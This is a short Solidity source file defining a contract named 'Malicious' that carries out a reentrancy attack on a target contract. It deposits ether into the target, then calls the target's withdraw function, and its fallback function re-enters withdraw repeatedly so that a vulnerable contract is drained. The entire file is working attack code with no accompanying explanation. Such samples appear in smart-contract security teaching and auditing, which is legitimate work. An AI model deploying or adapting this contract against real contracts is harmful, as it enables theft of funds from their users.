pragma solidity ^0.4.0;

contract Malicious {

    uint256 public myAccount = 0;
    address public target = 0;

    function setupTarget(address weak){
        target = weak;
    }
    function setupDeposit() payable {
        target.call.value(msg.value)(bytes4(sha3("deposit()")));
        myAccount = msg.value;
    }

    function () payable{
        if (msg.sender.call(bytes4(sha3("withdraw(uint256)")), myAccount)){
            return;
        }
    }

    function withdraw() {
        target.call(bytes4(sha3("withdraw(uint256)")), myAccount);
   }
}